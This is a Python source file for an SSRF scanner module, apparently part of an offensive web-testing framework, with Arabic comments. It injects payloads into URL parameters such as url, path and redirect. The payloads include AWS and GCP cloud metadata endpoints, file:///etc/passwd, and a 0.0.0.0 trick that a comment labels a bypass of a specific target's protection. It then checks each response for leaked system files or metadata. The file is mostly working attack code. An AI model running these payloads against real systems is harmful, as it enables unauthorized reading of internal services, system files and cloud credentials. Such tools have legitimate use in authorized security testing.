# modules/ssrf.py
import urllib.parse
from core.colors import Colors
from utils.helpers import quote

class NPXSSRFScanner:
    def __init__(self, framework):
        self.framework = framework
        self.session = framework.session_manager
        self.findings = []

    def test_ssrf(self, url, param):
        """اختبار SSRF باستخدام بايلودات متعددة"""
        
        # بايلودات SSRF – تشمل تجاوز 0.0.0.0 الخاص بـ Cohort
        endpoints = [
            "http://0.0.0.0/status",           # ✅ تجاوز حماية Cohort
            "http://127.0.0.1/status",         # ❌ ممنوع عادة
            "http://169.254.169.254/latest/meta-data/",  # AWS Metadata
            "http://metadata.google.internal/computeMetadata/v1/",  # GCP
            "file:///etc/passwd",
            "http://localhost:8080/admin",
            "http://0.0.0.0:8888/api/version", # Marimo (Cohort)
        ]
        
        for endpoint in endpoints:
            try:
                # بناء الرابط مع البايلود
                test_url = url.replace(f"{param}=", f"{param}={quote(endpoint)}")
                
                # إرسال الطلب
                response = self.session.send_request("GET", test_url)
                
                if response:
                    content = response.text
                    
                    # الكشف عن SSRF
                    indicators = {
                        'root:x:0:0': 'File read via file:///etc/passwd',
                        'upstreams': 'Internal services exposed (nginx upstreams)',
                        'service': 'Internal service info exposed',
                        'instance-id': 'AWS Metadata exposed',
                        'computeMetadata': 'GCP Metadata exposed',
                        'marimo': 'Marimo notebook exposed internally',
                    }
                    
                    for indicator, desc in indicators.items():
                        if indicator in content:
                            self.findings.append({
                                'type': 'SSRF',
                                'url': test_url,
                                'details': desc,
                                'endpoint': endpoint
                            })
                            print(f"{Colors.FAIL}[!] SSRF Found! {desc}{Colors.ENDC}")
                            print(f"{Colors.DIM}    URL: {test_url[:100]}...{Colors.ENDC}")
                            break
                            
            except Exception as e:
                # تجاهل الأخطاء الفردية
                pass
                
        return self.findings

    def run(self, target_urls):
        """تشغيل ماسح SSRF على جميع الروابط القابلة للاختبار"""
        
        print(f"{Colors.OKCYAN}[*] Module: SSRF Scanner...{Colors.ENDC}")
        
        # البحث عن بارامترات قابلة للاختبار
        testable_params = ['url', 'uri', 'path', 'src', 'dest', 'redirect', 'link', 'file', 'page', 'load']
        
        for url in target_urls:
            if '?' not in url or '=' not in url:
                continue
                
            parsed = urllib.parse.urlparse(url)
            for part in parsed.query.split('&'):
                if '=' in part:
                    param = part.split('=')[0]
                    if param.lower() in testable_params:
                        self.test_ssrf(url, param)
        
        if self.findings:
            print(f"{Colors.OKGREEN}[+] Found {len(self.findings)} SSRF vulnerabilities.{Colors.ENDC}")
        else:
            print(f"{Colors.DIM}[-] No SSRF vulnerabilities found.{Colors.ENDC}")
            
        return self.findings
